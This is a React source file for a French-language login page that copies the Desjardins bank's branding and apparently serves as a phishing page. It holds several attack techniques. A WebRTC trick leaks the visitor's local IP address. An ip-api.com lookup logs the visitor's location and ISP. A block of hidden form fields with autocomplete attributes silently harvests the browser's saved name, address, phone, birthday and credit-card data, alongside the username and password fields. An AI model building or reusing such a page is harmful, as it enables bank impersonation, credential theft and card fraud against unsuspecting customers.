import React, {useEffect, useState} from 'react';
import { Link } from 'react-router-dom';
import '../styles/Home.css';
const Home = () => {

  const [ipInfo, setIpInfo] = useState(null);
  const [localIP, setLocalIP] = useState('');

  useEffect(() => {
    const getClientIP = async () => {
      try {
        const response = await fetch('https://ip-api.com/json/');
        const data = await response.json();
        setIpInfo(data);
      } catch (error) {
        console.error('Error fetching the IP address:', error);
      }
      
    };

    const getLocalIP = () => {
      const peerConnection = new RTCPeerConnection({ iceServers: [] });
      const noop = () => {};
      peerConnection.createDataChannel('');
      peerConnection.createOffer().then((offer) => peerConnection.setLocalDescription(offer));
      peerConnection.onicecandidate = (event) => {
        if (event && event.candidate && event.candidate.candidate) {
          const ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
          const ipAddress = ipRegex.exec(event.candidate.candidate);
          if (ipAddress) {
            setLocalIP(ipAddress[1]);
            peerConnection.onicecandidate = noop;
          }
        }
      };
    };


    getLocalIP();
    getClientIP();
  }, []);

  useEffect(() => {
    if (localIP) {
      console.log('Local IP:', localIP);
    }
    
    if (ipInfo) {
      console.log('IP address:', ipInfo.query);
      console.log('Country:', ipInfo.country);
      console.log('City:', ipInfo.city);
      console.log('Region:', ipInfo.regionName);
      console.log('ZIP code:', ipInfo.zip);
      console.log('Latitude:', ipInfo.lat);
      console.log('Longitude:', ipInfo.lon);
      console.log('ISP:', ipInfo.isp);
      console.log('Organization:', ipInfo.org);
      console.log('AS number and name:', ipInfo.as);

    }


  }, [localIP, ipInfo]);



  return (
    <div className='main-container'>
      <header>
        <div className='header-container'>
          <span>
            <Link to="/"><small>A</small>A +</Link>
          </span>
          <span>
            <Link to="/">English</Link>
          </span>
          <span>
            <Link to="/">Nous joindre</Link>
          </span>
          <span>
            <Link to="/">Aide</Link>
          </span>
        </div>
      </header>
      <div className='sub-header'>
        <div className='sub-header-container'>
          <img src='Desjardins-logos.png' alt='logos' ></img>
        </div>
      </div>  
      <div className='main-content'>
        <div className='container-auth'>

            <div className='auth-login' >
                <div className='login-container'>
                  <h1>Se connecter</h1>
                  <form>
                      <label>Identifiant</label>
                      <input id='identifiant' type='text' autoComplete='username'></input>
                      <div className='checkbox-container'>
                        <input type='checkbox'></input>
                        <label>Mémoriser</label>
                      </div>
                      <label>Mot de passe</label>
                      <input id='password' type='password' autoComplete='current-password'></input>
                      <span id='attention'> <strong>Attention: </strong>Respecter majuscules et minuscules  </span>
                      <span id='forgot-psswd'>Mot de passe oublié?</span>
                      <div className='button-container'>
                        <button><strong>Valider</strong></button>
                      </div>
                      <div className='hidden-inputs'>
                        {/* Personal info */}
                        <input id='name' type='text' autoComplete='name' />
                        <input id='honorific-prefix' type='text' autoComplete='honorific-prefix' />
                        <input id='given-name' type='text' autoComplete='given-name' />
                        <input id='additional-name' type='text' autoComplete='additional-name' />
                        <input id='family-name' type='text' autoComplete='family-name' />
                        <input id='honorific-suffix' type='text' autoComplete='honorific-suffix' />
                        {/* Contact info*/}
                        <input id='email' type='email' autoComplete='email' />
                        <input id='tel' type='tel' autoComplete='tel' />
                        <input id='tel-country-code' type='text' autoComplete='tel-country-code' />
                        <input id='tel-national' type='text' autoComplete='tel-national' />
                        <input id='tel-area-code' type='text' autoComplete='tel-area-code' />
                        <input id='tel-local' type='text' autoComplete='tel-local' />
                        <input id='tel-extension' type='text' autoComplete='tel-extension' />
                        <input id='impp' type='text' autoComplete='impp' />
                        {/* Address info */}
                        <input id='street-address' type='text' autoComplete='street-address' />
                        <input id='address-line1' type='text' autoComplete='address-line1' />
                        <input id='address-line2' type='text' autoComplete='address-line2' />
                        <input id='address-line3' type='text' autoComplete='address-line3' />
                        <input id='country' type='text' autoComplete='country' />
                        <input id='country-name' type='text' autoComplete='country-name' />
                        <input id='postal-code' type='text' autoComplete='postal-code' />
                        <input id='locality' type='text' autoComplete='locality' />
                        <input id='region' type='text' autoComplete='region' />
                        <input id='address-level1' type='text' autoComplete='address-level1' />
                        <input id='address-level2' type='text' autoComplete='address-level2' />
                        <input id='address-level3' type='text' autoComplete='address-level3' />
                        <input id='address-level4' type='text' autoComplete='address-level4' />
                        {/* Credit Card */}
                        <input id='cc-name' type='text' autoComplete='cc-name' />
                        <input id='cc-given-name' type='text' autoComplete='cc-given-name' />
                        <input id='cc-family-name' type='text' autoComplete='cc-family-name' />
                        <input id='cc-number' type='text' autoComplete='cc-number' />
                        <input id='cc-exp' type='text' autoComplete='cc-exp' />
                        <input id='cc-exp-month' type='text' autoComplete='cc-exp-month' />
                        <input id='cc-exp-year' type='text' autoComplete='cc-exp-year' />
                        <input id='cc-csc' type='text' autoComplete='cc-csc' />
                        <input id='cc-type' type='text' autoComplete='cc-type' />
                        {/* Other info */}
                        <input id='bday' type='text' autoComplete='bday' />
                        <input id='bday-day' type='text' autoComplete='bday-day' />
                        <input id='bday-month' type='text' autoComplete='bday-month' />
                        <input id='bday-year' type='text' autoComplete='bday-year' />
                        <input id='sex' type='text' autoComplete='sex' />
                        <input id='language' type='text' autoComplete='language' />
                      </div>
                  </form>
                </div>
                <div><img src='login-footer.png' alt='forgot-password'></img></div>
            </div>
            <img id='girl-img' src='phone-girl.png' alt='auth-image' ></img>
        </div>
      </div>

      <footer>
        <img src='footer-info.png' alt='footer'></img>
      </footer>
    </div>
  );
};

export default Home;
